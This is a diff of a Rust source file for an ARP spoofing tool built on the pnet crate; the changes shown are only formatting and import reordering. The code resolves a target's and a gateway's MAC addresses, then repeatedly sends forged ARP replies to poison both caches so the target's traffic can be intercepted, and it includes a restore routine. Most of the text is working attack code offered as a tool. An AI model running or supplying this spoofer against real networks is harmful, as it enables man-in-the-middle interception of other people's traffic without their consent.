@@ -1,11 +1,11 @@
 use pnet::datalink::{self, Channel, NetworkInterface};
+use pnet::packet::MutablePacket;
 use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
 use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
-use pnet::packet::MutablePacket;
 use pnet::util::MacAddr;
 use std::net::{IpAddr, Ipv4Addr};
-use std::time::{Duration, Instant};
 use std::thread;
+use std::time::{Duration, Instant};
 
 pub struct ArpSpoofer {
     pub interface: NetworkInterface,
@@ -18,17 +18,21 @@ pub struct ArpSpoofer {
 }
 
 impl ArpSpoofer {
-    pub fn new(interface_name: &str, target_ip: Ipv4Addr, gateway_ip: Ipv4Addr) -> Result<Self, String> {
+    pub fn new(
+        interface_name: &str,
+        target_ip: Ipv4Addr,
+        gateway_ip: Ipv4Addr,
+    ) -> Result<Self, String> {
         let interfaces = datalink::interfaces();
         let interface = interfaces
             .into_iter()
             .find(|iface| iface.name == interface_name)
             .ok_or_else(|| format!("Interface '{}' not found", interface_name))?;
 
-        let attacker_mac = interface.mac
-            .ok_or("No MAC address found for interface")?;
-        
-        let attacker_ip = interface.ips
+        let attacker_mac = interface.mac.ok_or("No MAC address found for interface")?;
+
+        let attacker_ip = interface
+            .ips
             .iter()
             .find(|ip| ip.is_ipv4())
             .and_then(|ip| match ip.ip() {
@@ -58,15 +62,19 @@ impl ArpSpoofer {
 
     pub fn discover(&mut self) -> Result<(), String> {
         println!("[*] Discovering MAC addresses...");
-        
+
         println!("[*] Looking for target: {}", self.target_ip);
-        self.target_mac = Some(self.get_mac_address(self.target_ip)
-            .ok_or_else(|| format!("Could not find MAC for target IP: {}", self.target_ip))?);
+        self.target_mac = Some(
+            self.get_mac_address(self.target_ip)
+                .ok_or_else(|| format!("Could not find MAC for target IP: {}", self.target_ip))?,
+        );
         println!("[+] Target MAC: {}", self.target_mac.unwrap());
 
         println!("[*] Looking for gateway: {}", self.gateway_ip);
-        self.gateway_mac = Some(self.get_mac_address(self.gateway_ip)
-            .ok_or_else(|| format!("Could not find MAC for gateway IP: {}", self.gateway_ip))?);
+        self.gateway_mac =
+            Some(self.get_mac_address(self.gateway_ip).ok_or_else(|| {
+                format!("Could not find MAC for gateway IP: {}", self.gateway_ip)
+            })?);
         println!("[+] Gateway MAC: {}", self.gateway_mac.unwrap());
 
         Ok(())
@@ -74,7 +82,7 @@ impl ArpSpoofer {
 
     fn get_mac_address(&self, ip: Ipv4Addr) -> Option<MacAddr> {
         let mut sender = self.create_channel().ok()?;
-        
+
         let mut buffer = [0u8; 42];
         {
             let mut eth_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
@@ -96,8 +104,8 @@ impl ArpSpoofer {
 
         // send_to returns Option<Result<(), Error>>, so handle properly
         match sender.send_to(&buffer, None) {
-            Some(Ok(())) => {}, // Successfully sent
-            _ => return None,   // Failed to send
+            Some(Ok(())) => {} // Successfully sent
+            _ => return None,  // Failed to send
         }
 
         // Listen for ARP reply
@@ -111,8 +119,8 @@ impl ArpSpoofer {
             if let Ok(packet) = receiver.next() {
                 if packet.len() >= 42 {
                     if let Some(arp) = ArpPacket::new(&packet[14..]) {
-                        if arp.get_sender_proto_addr() == ip 
-                            && arp.get_operation() == ArpOperations::Reply 
+                        if arp.get_sender_proto_addr() == ip
+                            && arp.get_operation() == ArpOperations::Reply
                         {
                             return Some(arp.get_sender_hw_addr());
                         }
@@ -123,9 +131,14 @@ impl ArpSpoofer {
         None
     }
 
-    fn send_arp_poison(&self, target_ip: Ipv4Addr, target_mac: MacAddr, spoof_ip: Ipv4Addr) -> Result<(), String> {
+    fn send_arp_poison(
+        &self,
+        target_ip: Ipv4Addr,
+        target_mac: MacAddr,
+        spoof_ip: Ipv4Addr,
+    ) -> Result<(), String> {
         let mut sender = self.create_channel()?;
-        
+
         let mut buffer = [0u8; 42];
         {
             let mut eth_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
@@ -158,7 +171,10 @@ impl ArpSpoofer {
         let gateway_mac = self.gateway_mac.ok_or("Gateway MAC not discovered")?;
 
         println!("[*] Starting ARP poisoning...");
-        println!("[*] Target {} <-> Gateway {}", self.target_ip, self.gateway_ip);
+        println!(
+            "[*] Target {} <-> Gateway {}",
+            self.target_ip, self.gateway_ip
+        );
         println!("[*] Press Ctrl+C to stop\n");
 
         let mut count = 0;
@@ -177,21 +193,21 @@ impl ArpSpoofer {
 
     pub fn restore(&self) -> Result<(), String> {
         println!("\n[*] Restoring ARP tables...");
-        
+
         if let (Some(target_mac), Some(gateway_mac)) = (self.target_mac, self.gateway_mac) {
             for _ in 0..5 {
                 self.send_arp_poison(self.target_ip, target_mac, self.gateway_ip)?;
                 thread::sleep(Duration::from_millis(100));
             }
             println!("[+] Restored target's ARP table");
-            
+
             for _ in 0..5 {
                 self.send_arp_poison(self.gateway_ip, gateway_mac, self.target_ip)?;
                 thread::sleep(Duration::from_millis(100));
             }
             println!("[+] Restored gateway's ARP table");
         }
-        
+
         Ok(())
     }
 }
